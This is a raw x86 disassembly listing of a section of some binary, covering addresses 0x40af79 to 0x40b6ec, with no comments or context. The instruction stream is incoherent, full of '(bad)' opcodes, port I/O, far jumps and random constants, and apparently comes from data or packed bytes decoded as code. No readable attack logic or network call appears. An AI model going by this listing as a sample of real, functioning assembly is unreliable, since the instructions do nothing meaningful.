  40af79:	das    
  40af7a:	ret    
  40af7b:	mov    dl,0xa
  40af7d:	loop   0x40af95
  40af7f:	push   ss
  40af80:	outs   dx,DWORD PTR ds:[esi]
  40af81:	daa    
  40af82:	add    BYTE PTR [edx-0x3b],dh
  40af85:	lods   eax,DWORD PTR ds:[esi]
  40af86:	jg     0x40affc
  40af88:	and    DWORD PTR [eax+0x9],edi
  40af8b:	retf   
  40af8c:	cs jns 0x40afec
  40af8f:	xchg   esp,eax
  40af90:	jno    0x40af40
  40af92:	mov    BYTE PTR [edi],dh
  40af94:	push   edx
  40af95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af96:	and    eax,edi
  40af98:	and    esp,0xa64aa14f
  40af9e:	inc    edi
  40af9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa0:	and    bh,0x11
  40afa3:	jg     0x40af9e
  40afa5:	(bad)  
  40afa7:	in     al,0x6f
  40afa9:	inc    edi
  40afaa:	(bad)  
  40afab:	mov    bl,0x6e
  40afad:	aam    0xe4
  40afaf:	xchg   esp,eax
  40afb0:	jne    0x40afc9
  40afb2:	cmp    BYTE PTR [ecx-0x6bc28958],bh
  40afb8:	xchg   bh,al
  40afba:	iret   
  40afbb:	pop    ebp
  40afbc:	lahf   
  40afbd:	sub    DWORD PTR [edx],0x61
  40afc0:	jno    0x40af51
  40afc2:	jb     0x40b00c
  40afc4:	dec    edi
  40afc5:	rcl    ecx,1
  40afc7:	sahf   
  40afc8:	xchg   ebp,eax
  40afc9:	cli    
  40afca:	lods   al,BYTE PTR ds:[esi]
  40afcb:	or     al,0xc4
  40afcd:	xor    ah,cl
  40afcf:	ja     0x40aff3
  40afd1:	cmc    
  40afd2:	test   DWORD PTR [edi+0x11],ebp
  40afd5:	(bad)
  40afd9:	sub    eax,0xdab5405c
  40afde:	repnz sbb al,0xda
  40afe1:	adc    eax,0xc27fb77d
  40afe6:	pop    ebp
  40afe7:	(bad)  
  40afe8:	cmp    esp,DWORD PTR [ebx]
  40afea:	inc    edi
  40afeb:	sbb    BYTE PTR [ecx+0x7d],cl
  40afee:	inc    edx
  40afef:	hlt    
  40aff0:	enter  0x1f03,0x54
  40aff4:	adc    al,0x98
  40aff6:	jo     0x40b019
  40aff8:	js     0x40afc7
  40affa:	push   cs
  40affb:	sbb    BYTE PTR [eax],bl
  40affd:	pop    esp
  40affe:	cld    
  40afff:	jnp    0x40af82
  40b001:	int    0xd6
  40b003:	clc    
  40b004:	inc    edi
  40b005:	fs jmp 0xb2c7337b
  40b00b:	sbb    ah,0xc7
  40b00e:	mov    al,ds:0x880c424d
  40b013:	mov    dl,0xf6
  40b015:	adc    DWORD PTR [edi],ecx
  40b017:	pop    edx
  40b018:	loop   0x40afc3
  40b01a:	xchg   edi,eax
  40b01b:	lahf   
  40b01c:	mov    bh,BYTE PTR [bx]
  40b01f:	call   0x5fb035a0
  40b024:	addr16 push esi
  40b026:	mov    ds:0xfb6e32f7,eax
  40b02b:	fnstsw WORD PTR [edi+0x37e34acc]
  40b031:	push   ds
  40b032:	lahf   
  40b033:	add    DWORD PTR [eiz*4-0x702152c5],edx
  40b03a:	mov    esp,ebx
  40b03c:	clc    
  40b03d:	cmp    esp,DWORD PTR [eax-0x3bf8f791]
  40b043:	push   ss
  40b044:	call   0xfb264239
  40b049:	add    DWORD PTR [ebx],ecx
  40b04b:	add    ah,BYTE PTR [ebx+0x57283acf]
  40b051:	dec    ecx
  40b052:	xchg   esp,eax
  40b053:	cmp    ebx,DWORD PTR [edx+0x48b198b]
  40b059:	jl     0x40b0b2
  40b05b:	cmp    BYTE PTR [edx-0x242319b1],0xf8
  40b062:	pop    edi
  40b063:	xchg   BYTE PTR [eax+esi*8],bl
  40b066:	js     0x40b06a
  40b068:	inc    esp
  40b069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b06a:	or     DWORD PTR [ebx],ebp
  40b06c:	inc    eax
  40b06d:	jo     0x40b0af
  40b06f:	aaa    
  40b070:	(bad)  
  40b071:	xor    bh,BYTE PTR [eax-0x2f28e440]
  40b077:	lds    edx,FWORD PTR [eiz*2-0x74e6e49e]
  40b07e:	and    DWORD PTR [ebx+ebp*1],eax
  40b081:	mov    dh,0xc4
  40b083:	fadd   st,st(0)
  40b085:	inc    edi
  40b086:	(bad)  [edi]
  40b088:	lods   eax,DWORD PTR ds:[esi]
  40b089:	mov    ds:0xa9a26337,al
  40b08e:	add    eax,0x4811f3cf
  40b093:	mov    BYTE PTR [edx-0x26],ch
  40b096:	ds fucom st(0)
  40b099:	xor    al,0x96
  40b09b:	into   
  40b09c:	sbb    DWORD PTR [edx-0x2fa1ad2],0xcd84eb66
  40b0a6:	fdiv   QWORD PTR [edi-0x5edcf1cc]
  40b0ac:	(bad)  
  40b0ad:	shl    ecx,cl
  40b0af:	xor    DWORD PTR [ebp+eiz*1-0x4e],ecx
  40b0b3:	(bad)
  40b0b6:	and    BYTE PTR [ebx+eax*8],ch
  40b0b9:	sar    DWORD PTR ds:0x4ae78354,1
  40b0bf:	in     al,dx
  40b0c0:	out    0x6a,eax
  40b0c2:	adc    ah,BYTE PTR [esi]
  40b0c4:	ins    DWORD PTR es:[edi],dx
  40b0c5:	sti    
  40b0c6:	sub    BYTE PTR [ebx-0x92fc1f1],bh
  40b0cc:	hlt    
  40b0cd:	fld    st(3)
  40b0cf:	mov    esi,eax
  40b0d1:	xchg   edi,eax
  40b0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0d3:	stos   DWORD PTR es:[edi],eax
  40b0d4:	pop    ecx
  40b0d5:	shl    DWORD PTR [edi+0x57],1
  40b0d8:	sbb    eax,0x4cd2565d
  40b0dd:	gs push ds
  40b0df:	js     0x40b0a7
  40b0e1:	pop    ebx
  40b0e2:	test   ah,bh
  40b0e4:	push   es
  40b0e5:	pop    edi
  40b0e6:	sti    
  40b0e7:	je     0x40b158
  40b0e9:	pop    es
  40b0ea:	and    eax,0x4a66f5ca
  40b0ef:	or     BYTE PTR [ecx-0x7f],bl
  40b0f2:	pop    es
  40b0f3:	mov    ch,0x97
  40b0f5:	sub    al,0xcf
  40b0f7:	or     edi,DWORD PTR [ebp-0x2642e6bf]
  40b0fd:	retf   
  40b0fe:	cmp    al,0x38
  40b100:	rol    DWORD PTR [edi],1
  40b102:	scas   al,BYTE PTR es:[edi]
  40b103:	push   edi
  40b104:	jp     0x40b131
  40b106:	fcomp  DWORD PTR ds:0xaf985b04
  40b10c:	add    eax,0xf3e3589b
  40b111:	adc    eax,0x60995874
  40b116:	jge    0x40b0f9
  40b118:	mov    al,ds:0x886e3fa3
  40b11d:	pop    es
  40b11e:	into   
  40b11f:	cmp    DWORD PTR [edx+0x38b5bf35],ecx
  40b125:	lea    eax,[eax]
  40b127:	(bad)  
  40b128:	loopne 0x40b131
  40b12a:	fnstenv [edx-0x7fdef668]
  40b130:	(bad)  [edi+0x40]
  40b133:	or     bh,BYTE PTR ds:0xf35f06a5
  40b139:	fsubr  QWORD PTR [ebp-0x5bfe88e3]
  40b13f:	in     al,0x8b
  40b141:	adc    ebx,DWORD PTR [ebp+0x1b]
  40b144:	or     al,0xfb
  40b146:	repz ret 
  40b148:	outs   dx,BYTE PTR ds:[esi]
  40b149:	or     DWORD PTR [ebx-0x44975377],ecx
  40b14f:	dec    esi
  40b150:	push   es
  40b151:	ins    DWORD PTR es:[edi],dx
  40b152:	or     BYTE PTR [eax+edx*1-0x423a0537],dl
  40b159:	or     bh,0xde
  40b15c:	int3   
  40b15d:	ja     0x40b1a2
  40b15f:	(bad)  
  40b160:	ss dec ebx
  40b162:	pushf  
  40b163:	out    0xc8,al
  40b165:	in     al,dx
  40b166:	sbb    DWORD PTR [esp+edx*4],0x3
  40b16a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16b:	out    dx,eax
  40b16c:	xchg   edi,eax
  40b16d:	sub    dl,BYTE PTR [edi]
  40b16f:	mov    ebx,0x9d68243a
  40b174:	mov    ss,WORD PTR [ebx+ecx*1-0x7d]
  40b178:	fwait
  40b179:	out    dx,al
  40b17a:	sub    eax,0x450d3155
  40b17f:	loopne 0x40b1b4
  40b181:	test   al,0xf5
  40b183:	out    dx,eax
  40b184:	mov    WORD PTR [edi-0x655815bd],?
  40b18a:	jle    0x40b1b7
  40b18c:	mov    esp,0x83914d05
  40b191:	mov    ch,0xa0
  40b193:	daa    
  40b194:	mov    edx,0x47ac7f47
  40b199:	cs iret 
  40b19b:	mov    ds:0xffcfc96d,al
  40b1a0:	inc    esi
  40b1a1:	ret    0xcf96
  40b1a4:	mov    WORD PTR cs:0xfd7088da,ss
  40b1ab:	jmp    FWORD PTR [edi-0x6]
  40b1ae:	iret   
  40b1af:	ret    0x1c3b
  40b1b2:	imul   DWORD PTR [edi-0x68381e1]
  40b1b8:	repnz lock mov eax,0xea92c971
  40b1bf:	jecxz  0x40b1a3
  40b1c1:	aad    0x9e
  40b1c3:	push   ecx
  40b1c4:	out    dx,eax
  40b1c5:	aas    
  40b1c6:	sub    al,0x46
  40b1c8:	mov    bh,0x1e
  40b1ca:	lods   al,BYTE PTR ds:[esi]
  40b1cb:	xchg   ebx,eax
  40b1cc:	dec    eax
  40b1cd:	jecxz  0x40b152
  40b1cf:	jge    0x40b18f
  40b1d1:	push   cs
  40b1d2:	add    bl,ch
  40b1d4:	sub    ebx,DWORD PTR [edi-0x27]
  40b1d7:	sar    DWORD PTR [ebp+0x7939e0a0],0x48
  40b1de:	jge    0x40b1bf
  40b1e0:	mov    ah,0xe3
  40b1e2:	jno    0x40b1be
  40b1e4:	push   es
  40b1e5:	repz sbb eax,0x7f145081
  40b1eb:	idiv   bh
  40b1ed:	out    dx,al
  40b1ee:	in     eax,0xc4
  40b1f0:	test   DWORD PTR [esi-0x7b954a7c],eax
  40b1f6:	aas    
  40b1f7:	mov    edx,0xe2f7fa82
  40b1fc:	pusha  
  40b1fd:	retf   
  40b1fe:	clc    
  40b1ff:	jns    0x40b23f
  40b201:	xchg   ebp,eax
  40b202:	outs   dx,DWORD PTR ds:[esi]
  40b203:	xchg   BYTE PTR [esi-0x15],bl
  40b206:	ins    BYTE PTR es:[edi],dx
  40b207:	pop    eax
  40b208:	jne    0x40b256
  40b20a:	lods   al,BYTE PTR ds:[esi]
  40b20b:	or     bh,bh
  40b20d:	test   BYTE PTR ds:0x6bccd404,0x52
  40b214:	jmp    0xa30:0xdd661cab
  40b21b:	std    
  40b21c:	sbb    eax,0x44257a75
  40b221:	in     eax,dx
  40b222:	sbb    al,0x46
  40b224:	imul   ebp,ecx,0x2c
  40b227:	out    dx,al
  40b228:	or     eax,esp
  40b22a:	add    DWORD PTR [esi+0x13],esi
  40b22d:	add    al,0x7c
  40b22f:	cmp    BYTE PTR [ecx+0x2ed82aae],bl
  40b235:	sbb    bh,BYTE PTR [ebx]
  40b237:	pop    esp
  40b238:	mov    ds:0x3a9909d7,al
  40b23d:	fisttp WORD PTR [esi]
  40b23f:	jg     0x40b20a
  40b241:	inc    edx
  40b242:	ins    DWORD PTR es:[edi],dx
  40b243:	jno    0x40b2a6
  40b245:	push   0x74
  40b247:	mov    ebp,0xfcd4a20
  40b24c:	jne    0x40b272
  40b24e:	loop   0x40b1f6
  40b250:	xchg   DWORD PTR [eax-0x2a],edi
  40b253:	push   0x44
  40b255:	inc    esp
  40b256:	sub    ah,BYTE PTR [ebx-0x3186d444]
  40b25c:	push   ebp
  40b25d:	xor    al,0x4c
  40b25f:	jb     0x40b253
  40b261:	ror    DWORD PTR [eax-0x7753aef8],1
  40b267:	cmp    eax,0x5fb03490
  40b26c:	(bad)  
  40b26d:	aad    0x3c
  40b26f:	dec    esp
  40b270:	ffree  st(7)
  40b272:	and    DWORD PTR [esi],ebx
  40b274:	push   edi
  40b275:	(bad)  
  40b276:	sub    al,0x37
  40b278:	ret    0x2572
  40b27b:	out    0x7f,al
  40b27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27e:	sub    cl,BYTE PTR [eax+0x6c4c249]
  40b284:	pushf  
  40b285:	aam    0x8e
  40b287:	(bad)  
  40b288:	mov    edx,0x5fef4637
  40b28d:	cmp    BYTE PTR [edx+0x1c4ee47e],al
  40b293:	cmp    al,0xf2
  40b295:	repnz cmp dh,BYTE PTR [ebx+0x17e0a449]
  40b29c:	in     eax,0x42
  40b29e:	les    ebx,FWORD PTR [ecx]
  40b2a0:	mov    BYTE PTR [ecx+0x50bce8d8],bl
  40b2a6:	ds stos DWORD PTR es:[edi],eax
  40b2a8:	or     eax,0xbf9b1b94
  40b2ad:	int    0x17
  40b2af:	adc    ebp,DWORD PTR [ecx-0xbf0529f]
  40b2b5:	and    eax,DWORD PTR [eax]
  40b2b7:	mov    BYTE PTR [ebp-0x1a77aaed],ah
  40b2bd:	retf   
  40b2be:	pushf  
  40b2bf:	pop    esi
  40b2c0:	dec    eax
  40b2c1:	sub    eax,0x3bdd73cf
  40b2c6:	adc    BYTE PTR [eax],bh
  40b2c8:	add    eax,0x1e30c41
  40b2cd:	dec    edx
  40b2ce:	adc    BYTE PTR [ebx+0x78],bh
  40b2d1:	test   al,0xb9
  40b2d3:	add    BYTE PTR [eax-0x7f],bh
  40b2d6:	fild   DWORD PTR [edx+ebp*1]
  40b2d9:	pop    ebx
  40b2da:	lock pop esi
  40b2dc:	add    DWORD PTR [eax+esi*2],eax
  40b2df:	(bad)  
  40b2e0:	jmp    0xb4f8f223
  40b2e5:	scas   eax,DWORD PTR es:[edi]
  40b2e6:	pop    edi
  40b2e7:	push   ebx
  40b2e8:	add    ebp,DWORD PTR [ebp+0x8]
  40b2eb:	xor    dl,bh
  40b2ed:	out    0x2e,eax
  40b2ef:	fldcw  WORD PTR [esi-0x1f]
  40b2f2:	sub    bh,BYTE PTR [edx-0x26]
  40b2f5:	int3   
  40b2f6:	retf   
  40b2f7:	adc    al,0x87
  40b2f9:	sbb    eax,0xceb7a37
  40b2fe:	(bad)
  40b303:	(bad)  
  40b304:	call   0x604f:0xfe5426f5
  40b30b:	mov    bh,0xb4
  40b30d:	ret    0x86db
  40b310:	push   es
  40b311:	jns    0x40b306
  40b313:	mov    al,0xb2
  40b315:	push   ds
  40b316:	inc    ecx
  40b317:	outs   dx,BYTE PTR ds:[esi]
  40b318:	adc    al,0xc3
  40b31a:	lock adc BYTE PTR [edi],al
  40b31d:	mov    cl,0x6
  40b31f:	cmp    BYTE PTR ds:0x1742c4f6,dl
  40b325:	(bad)  
  40b326:	jmp    0xf2a60eaa
  40b32b:	mov    ebp,0x1a02fea3
  40b330:	dec    edi
  40b331:	push   ebx
  40b332:	mov    edi,DWORD PTR [edi+0x6bfdba4c]
  40b338:	jbe    0x40b2ce
  40b33a:	mov    al,ds:0xca44a84a
  40b33f:	mov    eax,0xb85a6b9c
  40b344:	lds    esp,FWORD PTR [ebx]
  40b346:	data16 jb 0x40b309
  40b349:	inc    esi
  40b34a:	mov    ebp,0x124503e1
  40b34f:	ins    BYTE PTR es:[edi],dx
  40b350:	jmp    0xc089:0x6a99853b
  40b357:	sub    eax,0x8f7de3d6
  40b35c:	arpl   di,si
  40b35e:	sub    dh,ch
  40b360:	out    0x9f,eax
  40b362:	cli    
  40b363:	scas   al,BYTE PTR es:[edi]
  40b364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b365:	mov    edi,0x36806559
  40b36a:	ret    
  40b36b:	mov    ah,0x6
  40b36d:	into   
  40b36e:	retf   0x5f7b
  40b371:	sar    DWORD PTR [ecx],1
  40b373:	fstp   DWORD PTR [ebx+ebp*2]
  40b376:	loop   0x40b30c
  40b378:	retf   0x8660
  40b37b:	aam    0x3d
  40b37d:	xor    ebx,DWORD PTR [eax]
  40b37f:	adc    dl,BYTE PTR [esp+edi*1-0x6d633de4]
  40b386:	sbb    DWORD PTR [eax+0x51],esi
  40b389:	pop    ds
  40b38a:	(bad)  [ecx-0x1d]
  40b38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b38e:	xchg   esp,eax
  40b38f:	scas   al,BYTE PTR es:[edi]
  40b390:	push   esp
  40b391:	pop    ebp
  40b392:	pop    esi
  40b393:	push   ebp
  40b394:	loope  0x40b403
  40b396:	sub    bh,0xb9
  40b399:	adc    al,0x67
  40b39b:	inc    esp
  40b39c:	es imul edi,ebx,0xae04e114
  40b3a3:	cld    
  40b3a4:	mov    edi,0x9bc17e23
  40b3a9:	sub    eax,DWORD PTR [ebx]
  40b3ab:	xor    dl,BYTE PTR [ecx]
  40b3ad:	sub    esi,esi
  40b3af:	push   ecx
  40b3b0:	jmp    0x5c50:0x3584f414
  40b3b7:	es stc 
  40b3b9:	loope  0x40b3dd
  40b3bb:	push   ds
  40b3bc:	test   BYTE PTR [ebx],0xe6
  40b3bf:	clc    
  40b3c0:	ins    DWORD PTR es:[edi],dx
  40b3c1:	xor    BYTE PTR [edx-0x197071a1],dh
  40b3c7:	and    eax,0x9ef67843
  40b3cc:	mov    edx,0x981cbde2
  40b3d1:	sub    eax,0x35b81499
  40b3d6:	mov    esp,DWORD PTR [ebx+0x18b074c3]
  40b3dc:	jns    0x40b3ea
  40b3de:	icebp  
  40b3df:	adc    eax,0x986dc08c
  40b3e4:	xchg   BYTE PTR [ebp-0x7],ch
  40b3e7:	hlt    
  40b3e8:	push   ds
  40b3e9:	imul   eax,DWORD PTR [edi+0x473f998f],0xffffffcc
  40b3f0:	mov    al,ds:0xf050f18c
  40b3f5:	fmul   DWORD PTR [eax-0x42]
  40b3f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3f9:	xor    eax,0x598491e1
  40b3fe:	jmp    esi
  40b400:	sbb    al,0xee
  40b402:	dec    ebp
  40b403:	sub    al,0x1b
  40b405:	sub    DWORD PTR [edi-0x24],eax
  40b408:	outs   dx,BYTE PTR ds:[esi]
  40b409:	ins    BYTE PTR es:[edi],dx
  40b40a:	push   ebx
  40b40b:	and    eax,0xfe22f209
  40b410:	rol    BYTE PTR [ecx+0x46],cl
  40b413:	sar    BYTE PTR [esi+0x3be00a26],cl
  40b419:	xor    BYTE PTR [ecx+ebx*8],dl
  40b41c:	shr    BYTE PTR [ecx+0x4e3ee9d5],0x2b
  40b423:	pushf  
  40b424:	retf   0x2eec
  40b427:	inc    esi
  40b429:	dec    ebp
  40b42a:	je     0x40b408
  40b42c:	cmp    ebx,esi
  40b42e:	and    BYTE PTR [eax],0x45
  40b431:	lahf   
  40b432:	mov    esp,0xd44f1a5a
  40b437:	jne    0x40b40a
  40b439:	hlt    
  40b43a:	pop    ss
  40b43b:	fstp   QWORD PTR [ecx]
  40b43d:	cmp    eax,0xb72563b3
  40b442:	cwde   
  40b443:	push   0x65f23d1
  40b448:	jae    0x40b44a
  40b44a:	push   esp
  40b44b:	jmp    0x40b47d
  40b44d:	popf   
  40b44e:	aam    0xf9
  40b450:	enter  0xa443,0x57
  40b454:	push   eax
  40b455:	xchg   DWORD PTR [ecx],esp
  40b457:	push   ebp
  40b458:	dec    ebx
  40b459:	sub    al,0xdb
  40b45b:	fistp  DWORD PTR [esi-0xf56b42c]
  40b461:	scas   eax,DWORD PTR es:[edi]
  40b462:	rcl    BYTE PTR [ebp-0x1a9c6d95],0xb0
  40b469:	or     eax,0x2976c5d0
  40b46e:	adc    DWORD PTR [ebx+0x7a],0x7d
  40b472:	in     eax,0xd3
  40b474:	aam    0xe3
  40b476:	push   cs
  40b477:	mov    edi,0xa2a86892
  40b47c:	pop    es
  40b47d:	add    edi,ecx
  40b47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b480:	lods   al,BYTE PTR ds:[esi]
  40b481:	rcl    ch,1
  40b483:	aam    0x85
  40b485:	jo     0x40b4c2
  40b487:	retf   0x3685
  40b48a:	jae    0x40b457
  40b48c:	mov    cl,0x10
  40b48e:	bound  ecx,QWORD PTR [eax-0x7ad66703]
  40b494:	std    
  40b495:	sbb    edi,DWORD PTR [esi+0x68]
  40b498:	std    
  40b499:	int    0x21
  40b49b:	sbb    dh,BYTE PTR [ebp-0x2279daac]
  40b4a1:	add    al,0x35
  40b4a3:	fwait
  40b4a4:	aaa    
  40b4a5:	push   ds
  40b4a6:	or     dl,dh
  40b4a8:	out    0x79,al
  40b4aa:	push   esi
  40b4ab:	in     al,dx
  40b4ac:	ret    
  40b4ad:	sub    BYTE PTR [edi-0x37],0x9e
  40b4b1:	pminsw mm2,mm1
  40b4b4:	pop    ss
  40b4b5:	sbb    DWORD PTR [esp+ebx*2],ecx
  40b4b8:	push   ds
  40b4b9:	pop    edx
  40b4ba:	and    ebp,DWORD PTR [edi+0x573ec096]
  40b4c0:	jb     0x40b4a2
  40b4c2:	mov    cl,0xcf
  40b4c4:	add    eax,esp
  40b4c6:	pop    edx
  40b4c7:	pop    edx
  40b4c8:	inc    esp
  40b4c9:	int    0x9b
  40b4cb:	pop    es
  40b4cc:	sahf   
  40b4cd:	dec    ecx
  40b4ce:	mov    ds:0x466d690e,al
  40b4d3:	adc    dh,BYTE PTR [esi+0x43]
  40b4d6:	into   
  40b4d7:	sub    eax,ebp
  40b4d9:	arpl   WORD PTR [esi-0x748f783f],bp
  40b4df:	add    al,0x34
  40b4e1:	jns    0x40b487
  40b4e3:	jne    0x40b4ce
  40b4e5:	fmul   QWORD PTR [esp+edi*4-0x2b]
  40b4e9:	mov    DWORD PTR [edi-0x18],edx
  40b4ec:	ins    BYTE PTR es:[edi],dx
  40b4ed:	mov    al,ds:0xaec552d0
  40b4f2:	test   DWORD PTR [edi+eax*2+0x44],0x3830a3a6
  40b4fa:	xchg   ecx,eax
  40b4fb:	xchg   esp,eax
  40b4fc:	inc    ebx
  40b4fd:	mov    dl,BYTE PTR [ecx+0x7f8e9a2f]
  40b503:	stos   DWORD PTR es:[edi],eax
  40b504:	shr    bl,1
  40b506:	mov    dh,0xdb
  40b508:	jle    0x40b4a6
  40b50a:	shr    BYTE PTR [ebp+0x12],0x21
  40b50e:	inc    edx
  40b50f:	popf   
  40b510:	arpl   WORD PTR [ebx],cx
  40b512:	shr    BYTE PTR fs:[edi],cl
  40b515:	(bad)  
  40b516:	cmp    bl,bh
  40b518:	pushf  
  40b519:	ret    0x6476
  40b51c:	pop    ebp
  40b51d:	sbb    DWORD PTR [edx+0x14],ecx
  40b520:	xchg   ebx,eax
  40b521:	sti    
  40b522:	mov    al,0xfb
  40b524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b525:	inc    esi
  40b526:	sar    ah,cl
  40b528:	sub    eax,0x133d9592
  40b52d:	sbb    dh,ah
  40b52f:	cmp    al,0x3f
  40b531:	mov    eax,ds:0xd43685fd
  40b536:	sub    esp,ecx
  40b538:	mov    ch,BYTE PTR [ecx+edi*2+0x33]
  40b53c:	pop    edi
  40b53d:	mov    eax,0x4f1e3b5b
  40b542:	inc    ebx
  40b543:	idiv   BYTE PTR [edi+0x47d5d459]
  40b549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b54a:	mov    esi,0xee5de8d9
  40b54f:	add    al,0xa7
  40b551:	sbb    eax,DWORD PTR [ebp-0x60fc6668]
  40b557:	lock pminub mm2,QWORD PTR [ebx]
  40b55b:	loop   0x40b5a6
  40b55d:	xchg   ebx,eax
  40b55e:	cmp    al,BYTE PTR [edi]
  40b560:	jecxz  0x40b5c3
  40b562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b563:	aam    0xff
  40b565:	push   esp
  40b566:	loope  0x40b517
  40b568:	xchg   ebp,ecx
  40b56a:	aas    
  40b56b:	and    dh,BYTE PTR [esi-0x2a]
  40b56e:	inc    ecx
  40b56f:	mov    DWORD PTR ds:0x6ece04f0,edx
  40b575:	bnd jge 0x40b571
  40b578:	int    0x91
  40b57a:	xor    edi,esp
  40b57c:	das    
  40b57d:	int    0xfd
  40b57f:	std    
  40b580:	lods   eax,DWORD PTR ds:[esi]
  40b581:	adc    eax,0x96b87039
  40b586:	pop    esp
  40b587:	pop    ss
  40b588:	lock xchg ecx,eax
  40b58a:	mov    edi,DWORD PTR [ebp+ecx*4+0xb]
  40b58e:	sub    al,0x6b
  40b590:	out    0x59,eax
  40b592:	ja     0x40b5f5
  40b594:	outs   dx,BYTE PTR ds:[esi]
  40b595:	imul   edx,ebx,0xaef0cbf9
  40b59b:	sub    edx,ebp
  40b59d:	das    
  40b59e:	es cdq 
  40b5a0:	mov    al,0xc1
  40b5a2:	dec    ebx
  40b5a3:	and    BYTE PTR [edi],0x6b
  40b5a6:	and    BYTE PTR [eax],al
  40b5a8:	nop
  40b5a9:	gs sub eax,0xcd4cfbc1
  40b5af:	lods   eax,DWORD PTR gs:[esi]
  40b5b1:	inc    edx
  40b5b2:	shr    BYTE PTR [edx-0x1d],1
  40b5b5:	int3   
  40b5b6:	mov    dl,dl
  40b5b8:	les    edx,FWORD PTR [ebx+0x3]
  40b5bb:	scas   al,BYTE PTR es:[edi]
  40b5bc:	dec    ebx
  40b5bd:	sbb    DWORD PTR [ebx+0x16051cc9],esi
  40b5c3:	jns    0x40b617
  40b5c5:	xor    ebp,DWORD PTR [eax+ebp*4+0x17b754be]
  40b5cc:	xor    DWORD PTR [ebx],esp
  40b5ce:	xchg   esi,eax
  40b5cf:	jae    0x40b597
  40b5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d2:	mov    al,ds:0xe1a6b64a
  40b5d7:	vpmacsdqh ymm4,ymm3,ymm4,YMMWORD PTR [esi-0x77]
  40b5de:	imul   edi,esp,0x57
  40b5e1:	xlat   BYTE PTR ds:[ebx]
  40b5e2:	outs   dx,BYTE PTR ds:[esi]
  40b5e3:	fstp   DWORD PTR [ecx-0x46d34b82]
  40b5e9:	enter  0x4969,0xa7
  40b5ed:	dec    eax
  40b5ee:	(bad)  
  40b5ef:	fucom  st(1)
  40b5f1:	jnp    0x40b5bf
  40b5f3:	test   BYTE PTR [eax-0x393589ab],dh
  40b5f9:	ror    dl,1
  40b5fb:	adc    ah,BYTE PTR [edx]
  40b5fd:	jno    0x40b595
  40b5ff:	pop    eax
  40b600:	jb     0x40b5c0
  40b602:	sbb    DWORD PTR [ecx-0x3f],ecx
  40b605:	xchg   DWORD PTR [eax+eax*1],esp
  40b608:	in     eax,0x32
  40b60a:	cld    
  40b60b:	mov    bh,0x6b
  40b60d:	lods   eax,DWORD PTR ds:[esi]
  40b60e:	leave  
  40b60f:	add    DWORD PTR [ebp-0x61c5636a],ecx
  40b615:	push   edi
  40b616:	pop    ebp
  40b617:	push   esp
  40b618:	xchg   edx,eax
  40b619:	mov    ebp,0x62c74e61
  40b61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b61f:	mov    ch,0x7f
  40b621:	ja     0x40b650
  40b623:	pop    ss
  40b624:	mov    ds:0x60deb725,al
  40b629:	add    al,0xb8
  40b62b:	inc    edi
  40b62c:	(bad)  
  40b62e:	sub    eax,0xa763e7bb
  40b633:	(bad)  [eax+0x22829d]
  40b639:	pop    esi
  40b63a:	stos   BYTE PTR es:[edi],al
  40b63b:	push   esp
  40b63c:	fstp   TBYTE PTR [edi-0x31]
  40b63f:	dec    ebp
  40b640:	out    0x37,al
  40b642:	jo     0x40b62f
  40b644:	sahf   
  40b645:	outs   dx,BYTE PTR ds:[esi]
  40b646:	sbb    eax,0xf92d2200
  40b64b:	in     eax,0xcc
  40b64d:	add    eax,0x9df30965
  40b652:	sbb    DWORD PTR [eax-0x6bdc6869],esi
  40b658:	stc    
  40b659:	push   ebp
  40b65a:	js     0x40b6c3
  40b65c:	cwde   
  40b65d:	pop    ds
  40b65e:	iret   
  40b65f:	into   
  40b660:	stos   DWORD PTR es:[edi],eax
  40b661:	in     al,dx
  40b662:	mov    ch,0x36
  40b664:	ss stc 
  40b666:	imul   ebx,DWORD PTR [eax+0x4a9676c0],0x99b5ecf3
  40b670:	add    eax,0x401d2661
  40b675:	pop    eax
  40b676:	test   eax,0xdd63237a
  40b67b:	in     al,dx
  40b67c:	pushf  
  40b67d:	sbb    bl,BYTE PTR [eax-0x76]
  40b680:	mov    bl,0xdd
  40b682:	xchg   edx,eax
  40b683:	push   eax
  40b684:	push   es
  40b685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b686:	jmp    0x40b6f0
  40b688:	push   es
  40b689:	ds ret 0x25fe
  40b68d:	cmp    esi,DWORD PTR [ebx]
  40b68f:	push   0x54
  40b691:	or     cl,BYTE PTR [eax]
  40b693:	jmp    0x63bc:0xcac9dc41
  40b69a:	adc    eax,0xfa3f1375
  40b69f:	push   es
  40b6a0:	fwait
  40b6a1:	mov    WORD PTR [edx-0x51],es
  40b6a4:	add    al,0xb
  40b6a6:	xor    al,0xb7
  40b6a8:	div    DWORD PTR [ebp-0x47]
  40b6ab:	(bad)  
  40b6ac:	fdiv   QWORD PTR [eax+0x41]
  40b6af:	aam    0x27
  40b6b1:	and    edi,DWORD PTR [ebx]
  40b6b3:	iret   
  40b6b4:	mov    bh,0x89
  40b6b6:	xor    esi,eax
  40b6b8:	int3   
  40b6b9:	call   0x9f9e:0xf255fed3
  40b6c0:	jp     0x40b6a0
  40b6c2:	xor    esp,0xc7f125cd
  40b6c8:	push   eax
  40b6c9:	mov    ecx,0x11248d37
  40b6ce:	adc    al,0x20
  40b6d0:	inc    eax
  40b6d1:	rol    DWORD PTR [ecx+0x6715e6ae],1
  40b6d7:	call   0x2022:0x8f88684
  40b6de:	mov    ebx,0xee2cda06
  40b6e3:	je     0x40b68a
  40b6e5:	dec    edx
  40b6e6:	ror    BYTE PTR [esp+edi*8+0x2a],0xae
  40b6eb:	inc    ebp
  40b6ec:	pusha  
